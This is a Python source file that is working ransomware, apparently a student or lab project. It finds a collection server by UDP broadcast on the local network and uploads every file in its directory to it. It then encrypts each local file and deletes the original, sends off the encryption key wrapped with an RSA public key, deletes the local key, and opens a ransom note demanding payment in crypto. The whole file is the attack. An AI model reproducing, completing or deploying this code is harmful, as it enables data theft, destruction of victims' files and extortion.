import socket
import os
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key

DISCOVERY_PORT = 9999
PORT = 5001
KEY_FILE = 'master.key'

# DISCOVER : Brodcast Network
def discover_server():
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp.settimeout(3)

    targets = ['255.255.255.255', '172.28.255.255',]

    for target in targets:
        udp.sendto(b'FIND_SERVER', (target, DISCOVERY_PORT))

    try:
        data, addr = udp.recvfrom(1024)
        if data == b'SERVER_HERE':
            print(f'Found server: {addr[0]}')
            return addr[0]
    except:
        print('No Server')
        return None

# KEY
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    return key

def load_key():
    if not os.path.exists(KEY_FILE):
        return generate_key()
    with open(KEY_FILE, 'rb') as f:
        return f.read()
    
def load_public_key():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    pem_path = os.path.join(base_dir, 'public.pem')
    try:
        with open(pem_path, 'rb') as f:
            return load_pem_public_key(f.read())
    except FileNotFoundError:
        print('No public.pem')
        return None

# ENCRYPT
def encrypt_file(filepath, fernet):
    with open(filepath, 'rb') as f:
        data = f.read()

    encrypted = fernet.encrypt(data)

    with open(filepath + '.enc', 'wb') as f:
        f.write(encrypted)

    os.remove(filepath)
    print(f' {filepath} encrypted')

# FILE SCAN
def get_all_files(base_dir):
    all_files = []

    for root, dirs, files in os.walk(base_dir):
        for file in files:
            full_path = os.path.join(root, file)

            if file == KEY_FILE:
                continue
            if file.endswith('.enc'):
                continue
            if file == os.path.basename(__file__):
                continue
            if file == 'public.pem':
                continue

            all_files.append(full_path)

    return all_files

# SEND
def sendEncrypt():
    HOST = discover_server()
    if not HOST:
        return

    key = load_key()
    fernet = Fernet(key)
    public_key = load_public_key()

    if not public_key:
        return

    base_dir = os.path.dirname(os.path.abspath(__file__))
    files = get_all_files(base_dir)

    if not files:
        print('No files')
        return

    s = socket.socket()
    s.settimeout(10)

    try:
        s.connect((HOST, PORT))
        print(f'Connected')

        # FILES
        s.send(b'FILES'.ljust(16))
        s.send(f'{len(files)}'.encode().ljust(16))

        for i, filepath in enumerate(files):
            filesize = os.path.getsize(filepath)
            rel_path = os.path.relpath(filepath, base_dir)

            header = f'{rel_path}|{filesize}'
            s.send(header.encode().ljust(1024))

            if s.recv(4) != b'SEND':
                continue

            print(f'\n({i+1}/{len(files)}) {rel_path}')

            with open(filepath, 'rb') as f:
                while chunk := f.read(4096):
                    s.sendall(chunk)

            if s.recv(8).strip() == b'OK':
                print('Done')
                encrypt_file(filepath, fernet)
            else:
                print('Failed')

        # KEY
        s.send(b'KEY'.ljust(16))

        with open(KEY_FILE, 'rb') as f:
            key_data = f.read()

        encrypted_key = public_key.encrypt(
            key_data,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        filesize = len(encrypted_key)
        header = f'{KEY_FILE}.enc|{filesize}'
        s.send(header.encode().ljust(1024))
        s.sendall(encrypted_key)

        if s.recv(8).strip() == b'OK':
            os.remove(KEY_FILE)
        else:
            print('Key send failed')

    except Exception as e:
        print(f'Error: {e}')

    finally:
        s.close()

def ransomMsg():
    filename = "GOT HACKED!.txt"

    with open(filename, "w", encoding="utf-8") as file:
        file.write("You've been hacked. Send 1 M Baht to this Crypto Account: fdsfjdskjWEJFOJF1235489 then I'll give you the decryptor")

    try:
        if sys.platform == "win32":
            os.startfile(filename)
        elif sys.platform == "darwin":
            subprocess.call(["open", filename])
        else:
            subprocess.call(["xdg-open", filename])
    except Exception as e:
        print(e)

if __name__ == '__main__':
    sendEncrypt()
    ransomMsg()